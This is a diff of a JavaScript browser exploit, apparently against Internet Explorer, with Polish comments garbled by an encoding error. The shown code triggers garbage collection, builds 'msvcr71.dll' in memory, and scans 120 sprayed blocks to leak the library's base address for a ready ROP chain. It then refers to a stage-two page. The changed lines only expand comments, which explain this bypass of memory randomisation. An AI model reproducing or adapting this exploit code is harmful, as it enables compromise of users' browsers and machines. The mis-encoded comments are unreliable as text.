@@ -17,9 +17,9 @@ function heaps() {
   CollectGarbage();
 
   var code = unescape('%u0a3c%u0a0a') + //shity 
-             'ms'+                      //moglibysmy zaladowac dowolna biblioteke 
-             'vc'+                      //bo zapiszemy sobie adres bazowy
-             'r7'+                      //ale dla tej gotowy jest ropChain wiec nie bedziemy sie juz bardziej torturowac
+             'ms'+                      //moglibysmy zaladowaæ do pamiêci w³aœciwie dowoln¹ biblioteke 
+             'vc'+                      //poniewa¿ zapisujemy adres bazowy w jednym z bloków pamiêci które kontrolujemy
+             'r7'+                      //ale dla msvcr71 jest ju¿ gotowy ropChain, wiêc nie bêdziemy sie ju¿ bardziej torturowac
              '1.'+
              'dl'+
              'l' + 
@@ -55,8 +55,10 @@ function baseSearch() {   /* w ktoryms z bloków jest base adres, musimy go jakos
       
        base = 0;
        mem  = hold.getAttribute('skwokdowkdokwod');
-       for(i=0;i<120;i++) {     /* musimy sobie przeskanowac te 120 wielkich blokow bo gdzies tu jest adres bazowy dll */
-               
+       for(i=0;i<120;i++) {     /* musimy sobie przeskanowac te 120 wielkich blokow i znaleŸæ adres .dll */
+                                /* wiemy ¿e jego dwa ni¿sze bajty wynosz¹ 0x0000 podobnie jak terminator unicode stringa 
+								   "msvcr71.dll" i nic poza tym we wzorcu pamiêci i to powinno wystarczyæ, jeœli nie 
+								   mo¿emy znaleŸæ offset wzglêdem pierwszego bloku poniewa¿ wszystkie one do siebie idealnie przylegaj¹*/
               //alert(escape(mem[i].toString(16)));
                
        }
@@ -68,13 +70,13 @@ function msg() {  /* w tym momencie mamy base adres biblioteki w pamieci */
 
    baseOf = baseSearch();
    
-   parent.window.baseDll = baseOf;  /* zapiszmy go w oknie nadrzednym */
+   parent.window.baseDll = baseOf;  /* zapiszmy go w oknie nadrzêdnym */
 
    hold.setAttribute('skwokdowkdokwod',null);
    hold.removeAttribute('skwokdowkdokwod');
    CollectGarbage();
 
-   //window.location = 's2.html';
+   //window.location = 's2.html';     /* i mo¿emy w³aœciwie przejœæ do stage 2 */
 
 }
 
